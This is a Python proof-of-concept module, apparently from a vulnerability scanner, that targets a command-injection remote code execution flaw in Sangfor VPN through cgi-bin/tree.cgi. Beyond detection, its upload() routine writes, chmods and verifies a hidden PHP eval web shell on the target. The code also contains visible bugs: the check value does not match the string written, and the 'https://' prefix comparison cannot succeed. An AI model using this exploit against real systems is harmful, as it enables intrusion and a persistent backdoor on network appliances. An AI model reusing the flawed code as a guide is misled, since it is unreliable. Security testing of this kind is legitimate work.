#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author = 'orleven'

import random
from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.VPN
        self.name = 'sangfor vpn rce'
        self.keyword = ['sangfor']
        self.info = 'sangfor vpn rce'
        self.type = VUL_TYPE.RCE
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)

    async def prove(self):
        await self.get_url()
        if self.base_url != None and self.base_url[0:7]=='https://':
            async with ClientSession() as session:
                test = str(random.randint(100000, 999999))
                cmd = "echo -n -e 'test'>/etc/db/svpnrcico/.svpn_index.txt"
                url = self.base_url + "cgi-bin/tree.cgi?a=';%s;'a" % cmd
                async with session.get(url=url) as res:
                    if res != None:
                        url = self.base_url + "cgi-bin/php-cgi/html/svpnrcico/.svpn_index.txt"
                        async with session.get(url=url) as res:
                            text = await res.text()
                            if res != None and res.status == 200 and test in text:
                                self.flag = 1
                                self.res.append({"info": url, "key": url})

    async def upload(self):
        await self.get_url()
        if self.base_url != None and self.base_url[0:7]=='https://':
            async with ClientSession() as session:
                cmd = "echo -n -e '<?php eval($_POST[1]);?>'>/etc/db/svpnrcico/.svpn_index.php"
                url = self.base_url + "cgi-bin/tree.cgi?a=';%s;'a" % cmd
                async with session.get(url=url) as res:
                    if res != None:
                        cmd = "chmod 755 /etc/db/svpnrcico/.svpn_index.php"
                        url = self.base_url  + "cgi-bin/tree.cgi?a=';%s;'a" % cmd
                        async with session.get(url=url) as res:
                            if res!=None:
                                url = self.base_url + "cgi-bin/php-cgi/html/svpnrcico/.svpn_index.php"
                                async with session.get(url=url) as res:
                                    if res != None and res.status ==200 :
                                        self.flag = 1
                                        self.res.append({"info": url, "key":url + " pass=1"})
